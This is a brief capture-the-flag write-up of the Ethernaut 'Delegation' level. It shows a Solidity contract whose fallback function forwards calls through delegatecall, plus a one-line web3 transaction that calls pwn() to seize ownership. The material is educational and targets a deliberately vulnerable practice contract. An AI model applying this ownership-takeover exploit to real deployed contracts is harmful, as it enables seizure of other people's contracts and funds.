## Exploitation

Reference: [https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md](https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md)

### 1. Vulnerable Contract

Below is the **Delegation** contract from **Ethernaut**. That uses **`delegatecall`** method in the **`fallback()`** function.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

### 2. Attack

Call the **`pwn`** function by sending transaction because **`delegatecall`** exists in **`fallback`** function. This changes the owner of the contract "Delegate" to **`msg.sender`**. In short, we can become the owner of this contract.

```js
contract.sendTransaction({data: web3.sha3('pwn()').slice(0, 10)})
```
